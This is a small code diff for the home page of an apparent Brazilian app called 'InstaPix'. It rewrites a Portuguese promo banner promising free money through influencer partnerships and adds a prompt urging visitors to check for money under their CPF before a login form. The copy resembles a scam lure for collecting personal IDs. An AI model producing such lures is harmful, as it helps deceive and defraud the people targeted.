@@ -19,13 +19,16 @@ export default async function Home() {
 
       <div className="space-y-10">
 
-        <div className="flex items-center justify-center bg-[#bdeeea] p-4 rounded-lg shadow-2xl">
+        <div className="flex flex-col items-center justify-center bg-[#bdeeea] p-4 rounded-lg shadow-2xl">
           <p className="text-sm font-medium text-center">
-            Parabéns, vamos te dar um dinheiro com o app mais falado do momento!
+            Em parceria com grandes influenciadores o InstaPix é o app que mais distribui dinheiro no momento!
           </p>
         </div>
 
-        <LoginForm />
+        <div className="space-y-4">
+          <div className="text-black bg-white p-2 rounded-lg text-sm text-center">Consulte se existe valores disponíveis no seu CPF</div>
+          <LoginForm />
+        </div>
 
       </div>
 
